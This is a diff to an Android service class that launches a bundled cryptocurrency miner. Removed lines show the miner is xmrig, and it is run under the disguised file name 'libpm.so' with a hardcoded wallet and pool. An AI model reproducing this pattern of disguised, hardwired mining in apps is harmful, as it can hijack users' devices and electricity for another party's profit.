@@ -146,7 +146,7 @@ public class MiningService extends Service {
         try {
             // write the config
             // Tools.writeConfig(configTemplate, config.pool, config.username, config.threads, config.maxCpu, privatePath);
-            //run xmrig using the config // outdated
+            // we'll get these from the config object after it's working
             String wallet = "dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.20000";
             String max_bwt = "710";
             String pool = "us.hero.miner.us:1117";
@@ -156,13 +156,9 @@ public class MiningService extends Service {
                     "--retry-pause=2";
             String args = String.format(config_template, pool, wallet, max_bwt);
             String binary = "./libpm.so";
-
-            //String[] args = {"./xmrig"};
-            //ProcessBuilder pb = new ProcessBuilder(args);
             ProcessBuilder pb = new ProcessBuilder(binary, args);
 
             //in our directory, which is
-            // pb.directory(getApplicationContext().getFilesDir());
             java.io.File dir = new java.io.File(privatePath);
             pb.directory(dir); // needs to be a file type
 
@@ -178,7 +174,8 @@ public class MiningService extends Service {
             outputHandler.start();
             Toast.makeText(this, "started: ", Toast.LENGTH_SHORT).show();
         } catch (Exception e) {
-            Log.e("error","error"+e.getLocalizedMessage()+e.getCause());
+            Log.e("launcherror","error: "+e.getLocalizedMessage()+e.getCause());
+
             Toast.makeText(this, e.getLocalizedMessage(), Toast.LENGTH_SHORT).show();
             process = null;
         }
